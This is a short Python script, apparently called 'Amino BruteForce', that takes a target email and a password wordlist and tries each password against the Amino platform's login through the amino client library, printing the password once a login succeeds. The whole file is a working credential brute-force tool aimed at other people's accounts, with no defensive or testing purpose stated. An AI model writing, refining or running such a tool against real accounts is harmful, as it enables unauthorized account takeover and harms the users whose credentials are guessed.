import amino
import os
import time
#green: \033[0;32m
#yellow: \033[0;33m
#white: \033[0;37m
#blue: \033[0;34m
client=amino.Client()
print ("By Bovonos")
time.sleep(1)
print ("Amino BruteForce")
time.sleep(1)
email=input("Type Target Email:\033[0;32m ")
time.sleep(0.5)
passwords=input("\033[0;37mPasswords List:\033[0;32m ")
try:
	passlist=open(passwords,'r')
except:
	print ("\033[0;37m[\033[0;33m-\033[0;37m] Password List Not Found :\033[0;34m'\033[0;37m(")
	os._exit(1)
for passwlist in passlist:
	passwlist=passwlist.strip()
	try:
		client.login(email=email,password=passwlist)
		print ("\033[0;37m")
		print ("\033[0;33mPassword Found!")
		print ("")
		print ("\033[0;37mEmail:\033[0;32m ",email)
		print ("\033[0;37mPassword:\033[0;32m ",passwlist)
		print ("")
		print ("GoodBye :)")
		os._exit(1)
	except:
		pass
		print ("\033[0;37mTrying... -->",passwlist)